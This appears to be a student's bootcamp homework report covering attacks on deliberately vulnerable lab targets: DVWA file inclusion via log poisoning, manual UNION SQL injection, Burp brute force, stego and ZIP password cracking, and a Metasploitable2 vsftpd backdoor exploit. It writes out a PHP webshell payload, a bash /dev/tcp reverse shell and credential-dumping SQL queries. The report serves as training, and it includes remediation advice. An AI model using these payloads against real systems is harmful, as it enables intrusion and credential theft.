# DFCS Bootcamp – Day 7 Homework (File Inclusion, SQL Injection, Brute Force & Cracking)

**Name:** MUHAMMAD ZAIN NASIR  
**Program:** Digital Forensics & Cyber Security Bootcamp – PSEBCYBERISB02  
**Trainer:** Waseem Abbas Khan  
**Submitted:** Saturday 21 November 2026

**Repositories:**
- Task 1 → <https://github.com/the-raven-zn/dfcs-bootcamp/tree/main/s10-file-inclusion-and-sqli>
- Task 2 → <https://github.com/the-raven-zn/dfcs-bootcamp/tree/main/s11-bruteforce-and-cracking>

---

## Contents

| Task | Part | Topic | Marks |
|------|------|-------|-------|
| 1 | A | LFI to RCE | 20 |
| 1 | B | Manual SQL Injection | 20 |
| 1 | C | Remediation | 10 |
| 2 | A | Brute Force (Low / Medium / High) | 15 |
| 2 | B | Steganography | 15 |
| 2 | C | Archive Cracking | 10 |
| 2 | D | CVE Reproduction Report | 10 |

---

## Method

This assignment covers all seven parts from the Day 7 handout. Task 1 uses DVWA (Low security) served by nginx + php-fpm locally on Kali at `127.0.0.1:42001`. Task 2's brute-force and scanner exercises also run against DVWA; the steganography and archive-cracking parts operate on the local Kali filesystem only; the CVE reproduction builds a dual-adapter lab with Metasploitable2 on an isolated VMware VMnet1 host-only segment. No PHPSESSID from any live session is included in this report.

---

## Summary of Tasks

| # | Task | Target / Scenario | Weight | Headline Result |
|---|------|--------------------|--------|-----------------|
| 1A | LFI to RCE | DVWA File Inclusion — Low security | 20 % | Error-message path disclosure → log poisoning → interactive reverse shell as `_dvwa` |
| 1B | Manual SQLi | DVWA SQL Injection — Low security (no sqlmap) | 20 % | UNION extraction: 2 columns confirmed; full user table + MD5 hashes dumped |
| 1C | Remediation | File Inclusion vs SQL Injection | 10 % | Allowlist / parameterised queries; WAF is defence-in-depth only |
| 2A | Brute Force | DVWA Brute Force — Low / Medium / High | 15 % | Low & Medium cracked; High fully blocked by anti-CSRF token |
| 2B | Steganography | Local JPEG carrier | 15 % | Embedded, failed detection without key, passphrase cracked, payload extracted |
| 2C | Archive Cracking | Password-protected ZIP | 10 % | `$pkzip$` hash cracked instantly; legacy ZipCrypto weakness explained |
| 2D | CVE Reproduction | CVE-2011-2523 — vsftpd 2.3.4 — Metasploitable2 | 10 % | Root shell obtained; target confirmed unreachable from host network |

---

---

# TASK 1: File Inclusion and SQL Injection

---

## Task 1, Part A — LFI to RCE (20 Marks)

**Environment:** DVWA, Low security, local lab. Kali Linux 2026.2, DVWA installed via `apt install dvwa`, served by nginx + php-fpm on `127.0.0.1:42001`.

### 1. Baseline and Parameter Discovery

The File Inclusion module takes a `page` GET parameter:

```
http://127.0.0.1:42001/vulnerabilities/fi/?page=include.php
```

Vulnerable sink in `/usr/share/dvwa/vulnerabilities/fi/index.php`, line 36:

```php
if( isset( $file ) )
    include( $file );
```

`$file` is assigned directly from `$_GET['page']` in `low.php` with no validation, no allowlist, and no sanitisation whatsoever.

---

### 2. The Error-Message Step (Path Disclosure)

Two deliberate bad requests reveal the full server path before any exploit is attempted:

| Request | Observed error |
|---------|----------------|
| `?page=` (empty string) | PHP 8: `Uncaught ValueError: Path must not be empty in /usr/share/dvwa/vulnerabilities/fi/index.php:36` |
| `?page=asdfasdf` (non-existent file) | `Warning: include(asdfasdf): Failed to open stream: No such file or directory in /usr/share/dvwa/vulnerabilities/fi/index.php on line 36` |

**What the error reveals:**
- Absolute installation path: `/usr/share/dvwa/`
- Exact vulnerable line number: 36
- PHP `include_path`: `.:/usr/share/php`

This information directly guides the log-poisoning step in Section 5 (knowing the access log lives under `/var/log/dvwa/`).

*Screenshot: `1a-04-path-disclosure-warnings.png`*

---

### 3. Confirming LFI

```
http://127.0.0.1:42001/vulnerabilities/fi/?page=/etc/passwd
```

Response: full contents of `/etc/passwd` rendered in the browser — arbitrary local file read confirmed.

*Screenshot: `1a-01-lfi-etc-passwd.png`*

---

### 4. RFI is Blocked

DVWA reports: *"The PHP function allow_url_include is not enabled."* Remote File Inclusion (pulling an attacker-hosted shell via URL) is not available. The exploit therefore pivots to **local log poisoning** instead.

---

### 5. Log Poisoning → RCE

DVWA's nginx vhost logs every request to `/var/log/dvwa/access.log`, including the raw `User-Agent` header, with no sanitisation. By poisoning the log with a PHP one-liner and then including that log via LFI, arbitrary command execution is achieved.

**Step 1 — Poison the log:**

```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  -A "<?php system(\$_GET['cmd']); ?>" \
  "http://127.0.0.1:42001/vulnerabilities/fi/?page=include.php"
```

**Step 2 — Include the poisoned log and pass a command:**

```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  "http://127.0.0.1:42001/vulnerabilities/fi/?page=/var/log/dvwa/access.log&cmd=id"
```

**Result:**

```
uid=120(_dvwa) gid=120(_dvwa) groups=120(_dvwa)
```

Arbitrary command execution confirmed as the `_dvwa` web service account.

---

### 6. Reverse Shell

Listener on Kali (`192.168.153.128`):

```bash
nc -lvnp 4444
```

Payload (bash `/dev/tcp` reverse shell delivered via the same LFI + log-poisoning chain):

```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.153.128/4444 0>&1'" \
  -G "http://127.0.0.1:42001/vulnerabilities/fi/?page=/var/log/dvwa/access.log"
```

**Result:** interactive reverse shell received — `id` and `pwd` confirmed as `_dvwa@kali`.

*Screenshots: `1a-02-reverse-shell-connect.png`, `1a-03-reverse-shell-id-pwd.png`*

---

### 7. Why `nc -e` Does Not Work on Modern Kali

Kali's default `nc` (netcat-traditional / openbsd-netcat) ships **without the `-e` flag compiled in**, since `-e` (spawn a program and pipe it to the socket) was deliberately stripped from default builds as a hardening measure against trivial reverse-shell use — hence the pivot to a bash `/dev/tcp` reverse shell, which needs no `-e` support at all.

---

## Task 1, Part B — Manual SQL Injection (20 Marks)

**Environment:** DVWA, Low security, SQL Injection module (`/vulnerabilities/sqli/`). Every payload below was hand-crafted and submitted via the browser URL bar. `sqlmap` was not used at any point.

---

### 1. Baseline

```
?id=1&Submit=Submit
```

Returns `ID: 1 / First name: admin / Surname: admin` — confirms the parameter drives a database lookup.

*Screenshot: `1b-01-sqli-baseline-id1.png`*

---

### 2. Single-Quote Test

```
?id=1'&Submit=Submit
```

**Response:**

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
... near "1'" at line 1 in /usr/share/dvwa/vulnerabilities/sqli/source/low.php:11
```

Confirms `id` is concatenated directly into a SQL string with no sanitisation, discloses the source path, and identifies **MariaDB** as the backend.

*Screenshot: `1b-02-sqli-single-quote-error.png`*

---

### 3. ORDER BY — Column Count

| Payload | Result |
|---------|--------|
| `?id=1' ORDER BY 1-- -&Submit=Submit` | OK |
| `?id=1' ORDER BY 2-- -&Submit=Submit` | OK |
| `?id=1' ORDER BY 3-- -&Submit=Submit` | `Unknown column '3' in 'ORDER BY'` |

**Conclusion: the query returns 2 columns.**

*Screenshots: `1b-03-orderby-2-ok.png`, `1b-04-orderby-3-error.png`*

---

### 4. UNION SELECT — Confirm Injectable Columns

```
?id=0' UNION SELECT 1,2-- -&Submit=Submit
```

`id=0` forces the original row to return nothing, so only the injected row appears.

**Result:** `First name: 1 / Surname: 2` — column 1 maps to the First name slot, column 2 to the Surname slot.

*Screenshot: `1b-05-union-select-1-2.png`*

---

### 5. Database Name and Version

```
?id=0' UNION SELECT database(),version()-- -&Submit=Submit
```

**Result:** `First name: dvwa / Surname: 11.8.9-MariaDB-4 from Debian`

*Screenshot: `1b-06-db-version-enum.png`*

---

### 6. Table Enumeration with group_concat()

Per-row (finds both tables, one row each):

```
?id=0' UNION SELECT table_name,table_schema
  FROM information_schema.tables
  WHERE table_schema=database()-- -&Submit=Submit
```

Merged into a single row using `group_concat()` as required by the assignment:

```
?id=0' UNION SELECT group_concat(table_name),table_schema
  FROM information_schema.tables
  WHERE table_schema=database()-- -&Submit=Submit
```

**Result:** `First name: users,guestbook / Surname: dvwa`

*Screenshot: `1b-07-groupconcat-tables.png`*

---

### 7. Column Enumeration

```
?id=0' UNION SELECT group_concat(column_name),table_name
  FROM information_schema.columns
  WHERE table_name='users'-- -&Submit=Submit
```

Columns found: `user_id, first_name, last_name, user, password, avatar, last_login, failed_login`

(MariaDB's internal `mysql.user` system table also surfaced some columns — the target table was therefore fully-qualified in the final step.)

*Screenshot: `1b-08-column-enum.png`*

---

### 8. Final Extraction — Usernames and Password Hashes

```
?id=0' UNION SELECT group_concat(user,0x3a,password SEPARATOR 0x3c62723e),2
  FROM dvwa.users-- -&Submit=Submit
```

- `0x3a` = hex `:` (separates username from hash on each row)
- `0x3c62723e` = hex `<br>` (newlines each credential in the HTML output)
- `dvwa.users` fully-qualified to avoid ambiguity with `mysql.user`

**Dumped credentials:**

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

These are unsalted MD5 hashes — `5f4dcc3b5aa765d61d8327deb882cf99` is the well-known MD5 of the string `"password"`, trivially crackable via any rainbow table, which ties directly into the remediation discussion in Part C.

*Screenshot: `1b-09-final-creds-dump.png`*

---

## Task 1, Part C — Remediation (10 Marks)

**Shared root cause:** both vulnerabilities share the same underlying mistake — user-controlled input reaching a powerful interpreter (the PHP `include()` engine, or the SQL query engine) with no separation between *code/structure* and *data*. In the LFI case, `$_GET['page']` was passed directly into `include()`, letting an attacker redefine *which code runs*. In the SQLi case, `$_GET['id']` was concatenated directly into a SQL string, letting an attacker redefine *what the query itself does*, not just what value it searches for.

---

### Comparison Table

| | File Inclusion | SQL Injection |
|---|---|---|
| **Root cause** | User input passed directly to `include()`/`require()` | User input concatenated directly into a SQL string |
| **Primary fix** | Use a hardcoded **allowlist** mapping short safe keys (`page=file1`) to actual server-side filenames; `include()` only the mapped value — never the raw parameter | Use **parameterised queries / prepared statements** (mysqli bound parameters or PDO) so user input is always treated as data, never as SQL syntax |
| **Secondary hardening** | Disable `allow_url_fopen` / `allow_url_include`; run the web process in a chroot / filesystem jail; treat traversal-sequence stripping as defence-in-depth only | Enforce least-privilege DB accounts (no `FILE`, `DROP`, or cross-schema rights for the web app user); disable verbose SQL error output in production |
| **What doesn't fully fix it** | Blocklisting strings like `../` or `.php` — trivially bypassed via encoding, null bytes, or wrappers like `php://filter` | Manual escaping (`addslashes()`) — easy to miss edge cases and encoding tricks, as the `id` integer parameter demonstrated |
| **Role of a WAF** | Catches obvious `../../../etc/passwd` patterns but is bypassed by encoding or log poisoning (as demonstrated in Part A) | Catches common payloads (`UNION SELECT`, `' OR 1=1`) but bypassed by encoding, SQL comments, or alternate syntax |

**A WAF is defence-in-depth only, never the fix.** It filters known-bad patterns in front of the vulnerable code but doesn't change the code itself. New payload variations and misconfigurations bypass it. The real fix — allowlisting or parameterisation — must happen in the application logic itself.

---

### Why an Allowlist Beats a Blocklist in Both Cases

A blocklist tries to enumerate every *bad* input — but attackers only need one variation the defender didn't anticipate (a different encoding, a null byte, a PHP wrapper like `php://filter/convert.base64-encode/resource=`). The set of bad inputs is effectively infinite. An **allowlist** enumerates the small, finite set of *expected* inputs — exact permitted filenames for LFI; parameter placeholders for SQLi — and rejects everything else by default. This flips the security model from *"block what I can imagine"* to *"only allow what I explicitly expect"*, which is strictly stronger because it doesn't depend on the defender's imagination keeping pace with the attacker's creativity.

---

---

# TASK 2: Brute Force and Cracking

---

## Task 2, Part A — Brute Force (15 Marks)

**Environment:** DVWA Brute Force module (`/vulnerabilities/brute/`) at `http://127.0.0.1:42001`. Burp Suite Community Edition, Intruder — Sniper attack. Same five-word payload list for all three levels: `123456, letmein, admin, password, qwerty`. Target account: `admin`; correct password: `password`.

All three levels were tested by capturing a real wrong-login request in Burp Proxy, sending it to Intruder, marking only the `password` parameter value as the payload position, and firing the wordlist.

---

### Low Security

Security level: **Low**. A wrong-login request was captured and sent to Intruder. The captured request initially showed 0 request cookies — fixed by manually adding `Cookie: PHPSESSID=<value>; security=low` as a header before firing.

**Results:**

| Payload | Status | Length |
|---------|--------|--------|
| (baseline) | 200 | 4699 |
| 123456 | 200 | 4699 |
| letmein | 200 | 4699 |
| admin | 200 | 4699 |
| **password** | 200 | **4737 ← distinct response, login successful** |
| qwerty | 200 | 4699 |

**Outcome:** full success — no blocking, no delay, no CAPTCHA, no token. This matches Low's design intent (no security controls at all). Attack completed in well under a minute.

*Screenshot: `2a-01-low-intruder-results-success.png`*

---

### Medium Security

Security level: **Medium**. The session was refreshed (a stale `security=low` cookie was discarded) and a new request was captured. Same cookie-header fix applied: `Cookie: PHPSESSID=<value>; security=medium`.

**Results:**

| Payload | Status | Response time (ms) | Length |
|---------|--------|--------------------|--------|
| (baseline) | 200 | 2007 | 4708 |
| 123456 | 200 | 2008 | 4708 |
| letmein | 200 | 2006 | 4708 |
| admin | 200 | 2008 | 4708 |
| **password** | 200 | **7** | **4746 ← login successful** |
| qwerty | 200 | 2009 | 4708 |

**Why Medium does not stop the attack:**

DVWA's Medium Brute Force page adds no real anti-automation control — it only changes how a failed attempt is *rendered*. Every wrong guess took roughly two seconds to respond, while the single correct guess returned in just 7 ms (the reverse of a throttle, most likely reflecting extra server-side work on the error path rather than any intentional rate-limiting logic). There is no cap on the number of attempts, no account lockout, no CAPTCHA, and nothing that slows an automated client more than a human. A delay that is not tied to *attempt count* and does not block or lock the account is not a defence against brute force — an automated tool simply absorbs the wait and continues. Real defences require attempt-awareness: progressive lockout, CAPTCHA after N failures, or per-account/per-IP rate limiting, rather than a flat per-request pause.

*Screenshots: `2a-03-medium-intruder-results-success.png`, `2a-04-medium-cookie-header-positions.png`*

---

### High Security

Security level: **High**. Source inspection of `vulnerabilities/brute/source/high.php` revealed two controls absent at lower levels:

1. **Anti-CSRF token check:** `checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'index.php' )` — the token is regenerated by `generateSessionToken()` on **every** page load.
2. **Randomised delay on failure:** `sleep( rand(0, 3) )` — 0–3 seconds, unlike Medium's fixed delay.

The live `user_token` was read from the form's hidden input, placed in one Intruder request, and fired with the same wordlist — the token was left **static** across all requests (Sniper mode does not refresh the token per request).

**Results:**

| Payload | Status | Length |
|---------|--------|--------|
| (baseline) | 302 | 295 |
| 123456 | 302 | 295 |
| letmein | 302 | 295 |
| admin | 302 | 295 |
| password | 302 | 295 |
| qwerty | 302 | 295 |

All six requests rejected identically (302, length 295). Following the redirect confirmed **six stacked "CSRF token is incorrect" messages** — the token had already expired before Intruder sent its first request (viewing the page source to copy the token is itself a page load, triggering token regeneration).

**Outcome:** 0/6 requests processed. A naive static-payload Sniper attack is fully defeated at High. Defeating it correctly requires refreshing the CSRF token per request (e.g. via Burp Pro's session-handling macros — not available in Community Edition).

*Screenshots: `2a-05-high-intruder-positions-with-token.png`, `2a-06-high-intruder-results-all-blocked.png`, `2a-07-high-csrf-token-incorrect-messages.png`*

---

### Summary Across Levels

| Level | Result | Key Control | Effectiveness |
|-------|--------|-------------|---------------|
| Low | Cracked (`password`) | None | No protection |
| Medium | Cracked (`password`) | Fixed per-attempt delay (failure path only) | Ineffective — not attempt-count-aware, doesn't block automation |
| High | Fully blocked (0/6) | Anti-CSRF token regenerated every page load | Defeats naive automation; requires per-request token refresh to bypass |

---

## Task 2, Part B — Steganography (15 Marks)

**Environment:** Kali VM, local filesystem only. Tools: `steghide` 0.5.1, `stegcracker` 2.1.0.  
**Carrier image:** `/home/kali/Desktop/old_data/Logo_burpsuite.jpg` — a genuine JPEG, 4,611 bytes (4.5 KiB), Burp Suite application icon. No conversion was needed: steghide supports JPEG, BMP, WAV, and AU natively; PNG would require `zsteg` instead.

---

### 1. Checking Capacity (Baseline)

```bash
$ steghide info /home/kali/Desktop/old_data/Logo_burpsuite.jpg
"Logo_burpsuite.jpg":
  format: jpeg
  capacity: 213.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

Capacity: **213.0 bytes** — small but sufficient for a short payload. Note: the response when no data is embedded is *identical* to the response when data is present but the passphrase is wrong. This is a deliberate design choice — it prevents an attacker from confirming the mere *presence* of hidden data without the correct key.

*Screenshots: `2b-01-carrier-jpg-properties.png`, `2b-03-baseline-capacity-check.png`*

---

### 2. Hiding the Secret

Payload created:

```bash
$ echo "This is a hidden message for DVWA Assignment 7, Task 2 Part B." \
  > /home/kali/Desktop/secret.txt
```

Embedded into a **copy** of the carrier (keeping the original clean for comparison), protected with a passphrase:

```bash
$ steghide embed -cf /home/kali/Desktop/old_data/Logo_burpsuite.jpg \
                  -ef /home/kali/Desktop/secret.txt \
                  -sf /home/kali/Desktop/burpsuite_with_secret.jpg \
                  -p "AssignmentSecret123"
embedding "/home/kali/Desktop/secret.txt" in "Logo_burpsuite.jpg" ... done
writing stego file "burpsuite_with_secret.jpg" ... done
```

**File size comparison:**

| File | Size |
|------|------|
| `Logo_burpsuite.jpg` (clean) | 4,611 bytes |
| `burpsuite_with_secret.jpg` (with payload) | 5,392 bytes |

Size increased by 781 bytes — a detectable jump on a file this small. On a larger carrier image the same absolute increase would be a far smaller proportional change and far less noticeable; carrier file size matters significantly for how visible an embed is via simple file-size comparison.

*Screenshot: `2b-04-embed-and-filesize-diff.png`*

---

### 3. Detecting the Hidden Data

```bash
$ steghide info /home/kali/Desktop/burpsuite_with_secret.jpg
"burpsuite_with_secret.jpg":
  format: jpeg
  capacity: 213.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

Without the correct passphrase, `steghide info` output is **identical** to the clean baseline — it does not reveal whether data is actually present. In a real-world scenario, detecting the *presence* of hidden data (as opposed to extracting it) would instead rely on external statistical steganalysis tools examining DCT coefficient anomalies, not steghide's own info command.

*Screenshot: `2b-05-stego-info-and-stegcracker-install.png`*

---

### 4. Cracking the Passphrase

`stegcracker` installed:

```bash
$ sudo apt install stegcracker -y
```

Custom wordlist (realistic dictionary attack — full unbounded brute-force of arbitrary passphrases is computationally infeasible; a wordlist attack is how this is carried out in practice):

```bash
$ cat << 'EOF' > /home/kali/Desktop/wordlist.txt
password
123456
letmein
qwerty
AssignmentSecret123
admin123
burpsuite
dvwa2026
EOF
```

Crack run:

```bash
$ stegcracker /home/kali/Desktop/burpsuite_with_secret.jpg /home/kali/Desktop/wordlist.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
...
Counting lines in wordlist..
Attacking file 'burpsuite_with_secret.jpg' with wordlist 'wordlist.txt'..
Successfully cracked file with password: AssignmentSecret123
Tried 5 passwords
Your file has been written to: /home/kali/Desktop/burpsuite_with_secret.jpg.out
AssignmentSecret123
```

**Passphrase cracked in 5 attempts.** stegcracker's banner also notes it has been superseded by **StegSeek** (https://github.com/RickdeJager/stegseek), which processes the full 14-million-word `rockyou.txt` list in approximately 1.9 seconds versus ~5 hours for stegcracker — the current state-of-the-art tool for this attack.

*Screenshot: `2b-06-stegcracker-success.png`*

---

### 5. Extracting and Verifying the Content

```bash
$ cat /home/kali/Desktop/burpsuite_with_secret.jpg.out
This is a hidden message for DVWA Assignment 7, Task 2 Part B.
```

Confirmed identical to the original `secret.txt`. Full recovery chain demonstrated end to end:

**embed → (failed detection without key) → dictionary-crack passphrase → extract → verify content**

*Screenshot: `2b-07-extracted-content-verified.png`*

---

### Summary

| Step | Tool | Outcome |
|------|------|---------|
| Capacity check (clean file) | `steghide info` | 213.0 byte capacity; no data detected |
| Embed secret with passphrase | `steghide embed` | Success; file grew 4,611 → 5,392 bytes |
| Attempt detection without passphrase | `steghide info` | Output indistinguishable from clean file — presence not revealed |
| Crack passphrase | `stegcracker` + custom wordlist | Cracked in 5 attempts: `AssignmentSecret123` |
| Extract and verify | `cat` recovered `.out` file | Content matches original secret exactly |

---

## Task 2, Part C — Archive Cracking (10 Marks)

**Environment:** Kali VM, local filesystem only. Tools: `zip`, `zip2john` (John the Ripper suite), `john`.

---

### 1. Creating the Password-Protected Archive

```bash
$ zip -e /home/kali/Desktop/protected_archive.zip /home/kali/Desktop/secret.txt
Enter password:
Verify password:
  adding: home/kali/Desktop/secret.txt (stored 0%)
```

The `-e` flag encrypts the archive, prompting interactively for a password (set to `pass` — deliberately weak for demonstration). The payload file was `secret.txt` from Part B.

*Screenshot: `2c-01-zip-creation.png`*

---

### 2. Extracting the Hash with zip2john

```bash
$ zip2john /home/kali/Desktop/protected_archive.zip > /home/kali/Desktop/archive_hash.txt
$ cat /home/kali/Desktop/archive_hash.txt
protected_archive.zip/home/kali/Desktop/secret.txt:$pkzip$1*2*2*0*4b*3f*14e1b5ae*...*$/pkzip$:...
```

**Key finding — the hash format is `$pkzip$`.** This identifies the archive as using the **traditional PKZIP / "ZipCrypto" stream cipher** — the legacy encryption scheme from the original ZIP specification — as opposed to `$zip2$`, which would indicate modern AES-256 ZIP encryption.

*Screenshot: `2c-02-zip2john-hash-and-john-crack.png`*

---

### 3. Cracking with John the Ripper

Wordlist:

```bash
$ cat << 'EOF' > /home/kali/Desktop/zip_wordlist.txt
123456
letmein
password
pass
qwerty
admin
dvwa2026
EOF
```

Crack run:

```bash
$ john --wordlist=/home/kali/Desktop/zip_wordlist.txt /home/kali/Desktop/archive_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
pass             (protected_archive.zip/home/kali/Desktop/secret.txt)
1g 0:00:00:00 DONE (2026-11-20 15:48) 50.00g/s 350.0p/s 350.0c/s 350.0C/s 123456..dvwa2026
Session completed

$ john --show /home/kali/Desktop/archive_hash.txt
protected_archive.zip/...:pass:...::/home/kali/Desktop/protected_archive.zip
1 password hash cracked, 0 left
```

**Password `pass` recovered instantly (0 seconds elapsed, 350 candidates/sec).**

*Screenshot: `2c-02-zip2john-hash-and-john-crack.png`*

---

### 4. What the Hash Format Reveals About Protection Strength

The `$pkzip$` identifier is the signature of **legacy PKZIP / ZipCrypto encryption**, and its presence alone tells an analyst the archive's protection is fundamentally weak, regardless of password complexity:

- **Broken cipher design:** ZipCrypto is a proprietary stream cipher from the late 1980s with well-documented weaknesses. Biham & Kocher's known-plaintext attack can recover the internal key state — and in some cases derive the password — from as few as 12 bytes of known or guessable plaintext, without needing a password dictionary at all.

- **No key-stretching:** PKZIP's key derivation does virtually no computational work per guess, which explains why John reported **350 candidates per second** — orders of magnitude faster than a deliberately slow hash like bcrypt or Argon2 (a direct link to the Task 2 "Keep in mind" note: *bcrypt or Argon2 is the defence* against fast offline cracking).

- **Contrast with `$zip2$` (AES):** an AES-256-encrypted archive (created via 7-Zip or `zip --encryption-method aes256`) produces a `$zip2$` hash, backed by PBKDF2 key derivation, making each guess dramatically more expensive — the same attack methodology (extract hash → wordlist) would apply, but at a fraction of the speed.

- **Practical implication:** the hash format signature is itself diagnostic. Seeing `$pkzip$` immediately signals that confidentiality rests on an outdated, structurally weak cipher — password strength matters far less than it would for a `$zip2$`/AES archive, because the cipher's own weaknesses can be exploited independently of the password's complexity.

---

### Summary

| Step | Tool | Result |
|------|------|--------|
| Create protected ZIP | `zip -e` | Archive created, password `pass` |
| Extract hash | `zip2john` | Hash format: **`$pkzip$`** (legacy ZipCrypto, not AES) |
| Crack | `john --wordlist` | Cracked instantly (0 s elapsed, 350 candidates/sec) — `pass` recovered |
| Format implication | — | `$pkzip$` signals structurally weak legacy cipher; `$zip2$`/AES indicates modern PBKDF2-backed, far more resistant protection |

---

## Task 2, Part D — CVE Reproduction Report (10 Marks)

**CVE:** CVE-2011-2523 — vsftpd 2.3.4 Backdoor Command Execution  
**CVSS Score:** 10.0 (Critical)  
**Public PoC:** Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor`  
**Target:** Metasploitable2 (intentionally vulnerable Linux VM)  
**Attacker:** Kali Linux 2026.2

---

### 1. Lab Network Layout

| Machine | Role | IP Address | Adapter |
|---------|------|------------|---------|
| Kali Linux 2026.2 | Attacker | 192.168.206.128 | VMware VMnet1 (Host-Only) |
| Metasploitable2 | Target | 192.168.206.130 | VMware VMnet1 (Host-Only) |

Both VMs are on VMware's **VMnet1 Host-Only** virtual network — a private virtual network with no bridge to any physical LAN adapter or internet gateway. The host machine's real network adapter (Wi-Fi) sits on `192.168.132.0/24`, a completely separate subnet with no routing to or from `192.168.206.0/24`.

**Network topology:**

```
┌──────────────────────────────────────────────────────────┐
│   VMware Host-Only Network (VMnet1): 192.168.206.0/24   │
│                                                          │
│  ┌──────────────────┐       ┌───────────────────────┐   │
│  │  Kali Linux      │◄─────►│  Metasploitable2      │   │
│  │  192.168.206.128 │       │  192.168.206.130      │   │
│  │  (Attacker)      │       │  (Target/Vulnerable)  │   │
│  └──────────────────┘       └───────────────────────┘   │
└──────────────────────────────────────────────────────────┘
              │
              │  (Host virtual adapter only — no bridge outward)
              ▼
┌──────────────────────────────────────────────────────────┐
│   Real Host LAN (Wi-Fi): 192.168.132.0/24               │
│   Host: 192.168.132.176 — CANNOT reach .206.130         │
│   Internet: CANNOT be reached from 192.168.206.130      │
└──────────────────────────────────────────────────────────┘
```

**Isolation confirmed:**

- Kali ↔ Metasploitable2: reachable (ping: 4/4 packets received) — `2d-03-kali-ping-metasploitable-success.png`
- Metasploitable2 → 8.8.8.8 (internet): `Network is unreachable` (no outbound route) — `2d-07-metasploitable-ping-internet-unreachable.png`
- Host real subnet (`192.168.132.0/24`) vs. lab subnet (`192.168.206.0/24`): entirely separate, non-routed — `2d-06-host-ipconfig-separate-subnet.png`

**The vulnerable target (Metasploitable2 at 192.168.206.130) was not reachable from the real host network or the internet — only from within the isolated VMnet1 lab segment.**

*Screenshots: `2d-01-metasploitable2-ifconfig.png`, `2d-02-kali-ip-a.png`, `2d-03-kali-ping-metasploitable-success.png`, `2d-04-host-ping-metasploitable-via-vmnet.png`, `2d-05-metasploitable-ping-internet-usage-error.png`, `2d-06-host-ipconfig-separate-subnet.png`, `2d-07-metasploitable-ping-internet-unreachable.png`*

---

### 2. Vulnerability Description

**CVE-2011-2523** describes a malicious backdoor secretly introduced into the vsftpd 2.3.4 source code tarball distributed on the official project site between 30 June and 1 July 2011. The backdoor was not in the version-controlled repository — it was inserted only into the downloadable tarball on the main distribution server, suggesting a compromise of the server itself rather than the codebase. This makes it an early, documented example of a **software supply-chain attack**.

**Mechanism:** When a user attempts to log in and their username string contains a smiley face sequence (`:)`), the backdoor opens a listener on **TCP port 6200** on the target host and spawns `/bin/sh` bound to that port — granting any connecting client a direct command shell running as `root` (vsftpd runs as root to manage privilege separation). No authentication is required: any login attempt containing `:)` in the username, regardless of password, immediately grants full root access.

| Attribute | Detail |
|-----------|--------|
| Affected version | vsftpd 2.3.4 (backdoored tarball only) |
| Trigger | `:)` in the FTP username field, on TCP/21 |
| Backdoor listener | TCP/6200 — spawns `/bin/sh` as root |
| Authentication required | None |

---

### 3. Reconnaissance

```bash
$ nmap -sV -p 21 192.168.206.130
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

Service banner confirms vsftpd 2.3.4 — the exact vulnerable version — without any intrusive probe.

*Screenshot: `2d-08-nmap-vsftpd-234-confirmed.png`*

---

### 4. Exploitation

Metasploit's module automates the trigger and connection:

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.206.130
msf exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/reverse_netcat
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.206.128
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

**Output:**

```
[*] Started reverse TCP handler on 192.168.206.128:4444
[*] 192.168.206.130:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.206.130:21 - The target appears to be vulnerable.
[+] 192.168.206.130:21 - Backdoor has been spawned!
[*] Command shell session 1 opened (192.168.206.128:4444 → 192.168.206.130:57531)
```

*Screenshots: `2d-09-msf-search-vsftpd-use-module.png`, `2d-10-msf-show-options.png`, `2d-11-msf-payload-list.png`, `2d-12-msf-exploit-shell-opened.png`*

---

### 5. Post-Exploitation Proof

Commands run inside the obtained shell:

```bash
id
uid=0(root) gid=0(root)

whoami
root

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

hostname
metasploitable
```

**Full root shell obtained on Metasploitable2 (`192.168.206.130`) from Kali (`192.168.206.128`) — no credentials required.**

*Screenshots: `2d-13-root-shell-id-whoami.png`, `2d-14-root-shell-uname-hostname.png`*

---

### 6. Remediation

**Immediate fixes:**

| Action | Detail |
|--------|--------|
| Upgrade vsftpd immediately | Replace 2.3.4 with any subsequent clean release. Verify the downloaded tarball's SHA-256 checksum against the official checksum in the project's version control repository — not from the same distribution server that was compromised. |
| Block port 6200 at the firewall | As emergency containment, block inbound TCP/6200 at both the perimeter and host firewall until the service is updated. |
| Disable or replace vsftpd | If FTP is not strictly required, disable the service. FTP transmits credentials in plaintext and is superseded by SFTP and FTPS for all legitimate use cases. |

**Structural / process fixes:**

| Action | Detail |
|--------|--------|
| Verify software supply-chain integrity | The backdoor was introduced at the distribution level, not in source control — a supply-chain attack. All downloaded binaries and tarballs must have their checksums verified against a trusted, independent source. |
| Principle of least privilege | vsftpd ran as root; the backdoor inherited root. Containerisation (Docker, SELinux/AppArmor confinement, chroot jails) would not have prevented the backdoor triggering, but would have limited the blast radius to a confined shell rather than full system root. |
| Network segmentation | As demonstrated by this lab: placing vulnerable services on an isolated, non-routable segment limits the attacker's reach even after exploitation. An FTP server should not be reachable from arbitrary internet hosts. |
